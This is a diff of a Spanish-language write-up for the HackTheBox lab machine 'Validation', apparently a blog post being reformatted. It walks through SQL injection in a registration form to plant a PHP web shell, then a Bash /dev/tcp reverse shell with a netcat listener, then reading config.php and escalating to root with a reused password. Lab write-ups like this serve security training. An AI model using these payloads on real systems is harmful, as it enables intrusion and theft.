@@ -1,9 +1,9 @@
 ---
 title: Validation
-published: 2022-07-01
-tags: [Markdown, Blogging, Demo]
-category: Examples
-draft: true
+published: 2025-02-24
+image: "./logo.png"
+tags: [Easy, SQLi, RCE, Information Leakage, eJPT, eWPT]
+category: HackTheBox
 ---
 
 ## Información Básica
@@ -70,15 +70,15 @@ http://10.10.11.116 [200 OK] Apache[2.4.48], Bootstrap, Country[RESERVED][ZZ], H
 
 Vemos que usa **PHP** principalmente junto con **Apache**. Nada más entrar a la web podemos ver un pequeño formulario de registro con 2 campos.
 
-<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2Fo45BmozdNyqQ3ACBTkan%2Fimg1.png?alt=media&#x26;token=8eecd3a9-b48e-408b-ad39-5e0ce5f410e5" alt=""><figcaption></figcaption></figure>
+![Formulario](./1.png)
 
 ## Explotación
 
-El campo del **usuario** no es vulnerable a <mark style="color:red;">**SQL Injection**</mark>, pero podemos interceptar la petición con <mark style="color:orange;">**Burpsuite**</mark> y ver si el campo del "_País_" es vulnerable.
+El campo del **usuario** no es vulnerable a **SQL Injection**, pero podemos interceptar la petición con **Burpsuite** y ver si el campo del "_País_" es vulnerable.
 
-<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FtHsuOLd7WyXTdkpdgGIG%2Fimg2.png?alt=media&#x26;token=b13b50fe-537b-4618-8a53-281456816a3e" alt=""><figcaption></figcaption></figure>
+![SQL Injection](./2.png)
 
-Bingo! Como podemos ver con una sola **'**, vemos que da un error, por lo cual es vulnerable. Vamos a intentar subir una <mark style="color:purple;">**web shell**</mark> básica para <mark style="color:purple;">**PHP**</mark>**.**
+Bingo! Como podemos ver con una sola **'**, vemos que da un error, por lo cual es vulnerable. Vamos a intentar subir una **web shell** básica para **PHP**.
 
 ```
 <?php system($_GET['cmd']); ?>
@@ -92,15 +92,15 @@ username=sqli&country=Brazil' union all select "<?php system($_GET['cmd']); ?>" 
 ```
 {% endcode %}
 
-<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2Fs6SGza91kAoGh1Chv4vx%2Fimg3.png?alt=media&#x26;token=987816c5-f651-4f8b-a126-134b93936404" alt=""><figcaption></figcaption></figure>
+![CMD Injection](./3.png)
 
-Perfecto, hemos conseguido la web shell funcional, por lo que vamos a intentar obtener una persistencia. Usaremos esta <mark style="color:green;">**Bash TCP reverse shell**</mark>.
+Perfecto, hemos conseguido la web shell funcional, por lo que vamos a intentar obtener una persistencia. Usaremos esta **Bash TCP reverse shell**.
 
 ```
 bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
 ```
 
-Y luego la pasaremos al servidor mediante un servidor local con <mark style="color:yellow;">**python**</mark>.
+Y luego la pasaremos al servidor mediante un servidor local con **python**.
 
 ```
 python -m http.server 80
@@ -114,7 +114,7 @@ Después en la **URL** pondremos lo siguiente para obtener la **shell**.
 
 Una vez subido, para comprobar que todo ha ido bien, si ejecutamos un **ls** deberíamos poder ver la **revshell.sh.**&#x20;
 
-Para ejecutarla nos pondremos en escucha primero por el puerto que hayamos escogido con <mark style="color:orange;">**netcat**</mark>.
+Para ejecutarla nos pondremos en escucha primero por el puerto que hayamos escogido con **netcat**.
 
 ```
 nc -lvnp <PORT>
@@ -128,11 +128,11 @@ bash revshell.sh
 
 Si todo ha ido bien, deberíamos tener la reverse shell.
 
-<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FnH4zJYwUZl0xrB3SuA4y%2Fimg4.png?alt=media&#x26;token=154a99a6-f6bc-467f-b2b5-d34255a5a633" alt=""><figcaption></figcaption></figure>
+![Reverse Shell](./4.png)
 
 Estando dentro podemos ver que hay un archivo **config.php**, así que veremos su contenido, puede ser importante.
 
-<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2Ff7MLemV1MzAPAgxrlbty%2Fimg5.png?alt=media&#x26;token=a1d4e20a-dc7a-45ca-afe5-adb983798f70" alt=""><figcaption></figcaption></figure>
+![config.php](./5.png)
 
 Gracias al comando:
 
@@ -140,10 +140,8 @@ Gracias al comando:
 cat /etc/passwd | grep "bash"
 ```
 
-Podemos ver que solo existe el usuario **root**, que si probamos con la contraseña del **config.php** parecerá que se queda estancado, pero realmente ya hemos accedido al usuario y tenemos root. Ya solo queda obtener ambas flags del directorio <mark style="color:purple;">/home/\<usuario>/user.txt</mark> y <mark style="color:purple;">/root/root.txt</mark>.
+Podemos ver que solo existe el usuario **root**, que si probamos con la contraseña del **config.php** parecerá que se queda estancado, pero realmente ya hemos accedido al usuario y tenemos root. Ya solo queda obtener ambas flags del directorio /home/\<usuario>/user.txt y /root/root.txt.
 
-{% embed url="https://www.hackthebox.com/achievement/machine/1992274/401" %}
-
-
+[Pwned!](https://labs.hackthebox.com/achievement/machine/1992274/382)
 
 ---
